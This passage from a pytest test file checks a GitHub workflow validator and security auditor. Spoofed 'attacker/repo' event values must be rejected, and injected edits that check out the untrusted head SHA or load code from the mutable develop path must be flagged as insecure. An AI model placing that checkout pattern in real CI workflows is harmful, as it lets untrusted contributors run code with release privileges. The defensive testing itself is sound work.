    }
    replacements = {
        "name": ("workflow_name", "Attacker checks"),
        "conclusion": ("conclusion", "failure"),
        "branch": ("head_branch", "main"),
        "head-repository": ("head_repository", "attacker/repo"),
        "event-repository": ("event_repository", "attacker/repo"),
        "sha": ("head_sha", "A" * 40),
    }
    key, value = replacements[mutation]
    values[key] = value

    with pytest.raises(validator.ReadOnlyGitHubError):
        validator.validate_develop_workflow_run(**values)


def test_workflow_run_develop_event_validator_accepts_exact_trusted_identity() -> None:
    """Catches rejecting the successful same-repository develop source event."""
    validator = importlib.import_module("ucm_release_v2.github_readonly")
    sha = "a" * 40

    assert (
        validator.validate_develop_workflow_run(
            workflow_name="Push Commit Checks",
            workflow_event="push",
            workflow_path=".github/workflows/push-check.yml@develop",
            conclusion="success",
            head_branch="develop",
            head_repository="SuperMarioYL/unified-cache-management",
            event_repository="SuperMarioYL/unified-cache-management",
            head_sha=sha,
        )
        == sha
    )


@pytest.mark.parametrize("mutation", ["head-checkout", "develop-control-path"])
def test_develop_security_policy_rejects_head_control_execution(mutation: str) -> None:
    """Catches mutable develop bytes becoming executable controller code."""
    source = (
        REPOSITORY_ROOT / ".github/workflows/develop-release-dry-run.yml"
    ).read_text(encoding="utf-8")
    if mutation == "head-checkout":
        source = _replace_once(
            source,
            "ref: ${{ steps.control.outputs.control_sha }}",
            "ref: ${{ github.event.workflow_run.head_sha }}",
        )
    else:
        source = source.replace(
            "PYTHONPATH=control/.github/release/v2",
            "PYTHONPATH=.github/release/v2",
        )

    findings = _security().audit_workflow_source(source, "develop-release-dry-run.yml")

    assert findings, mutation
